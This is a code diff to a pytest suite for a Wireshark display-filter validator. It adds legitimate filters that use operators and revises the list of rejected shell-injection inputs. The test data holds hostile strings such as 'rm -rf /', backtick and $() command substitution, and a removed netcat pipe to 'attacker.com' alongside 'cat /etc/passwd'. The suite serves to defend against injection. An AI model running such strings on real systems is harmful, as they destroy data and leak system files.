@@ -56,19 +56,31 @@ class TestValidation:
             "ip.addr == 192.168.1.1",
             "tcp.flags.syn == 1",
             'http.request.method == "GET"',
+            # Comparison operators and the && / || boolean tokens are
+            # legitimate Wireshark syntax and must be accepted.
+            "goose.stNum > 0",
+            "tcp.window_size < 1024",
+            "tcp.flags.syn == 1 && tcp.flags.ack == 0",
+            "http.request || http.response",
         ]
         for filter_expr in valid_filters:
             result = validate_display_filter(filter_expr)
             assert result == filter_expr
 
     def test_validate_display_filter_injection_attempts(self) -> None:
-        """Test rejection of injection attempts in display filters."""
+        """Test rejection of shell-injection attempts in display filters.
+
+        tshark is always invoked via ``create_subprocess_exec`` with an
+        explicit argv, so most characters that would matter in a shell are
+        irrelevant here. We still reject the ones that could break out of an
+        argv element if the value ever did reach a shell.
+        """
         dangerous_filters = [
             "tcp; rm -rf /",
-            "http && cat /etc/passwd",
-            "tcp | nc attacker.com 1234",
             "http`whoami`",
             "tcp$(id)",
+            "x${HOME}y",
+            "tcp\nrm -rf /",
         ]
         for filter_expr in dangerous_filters:
             with pytest.raises(ValueError, match="Invalid character"):
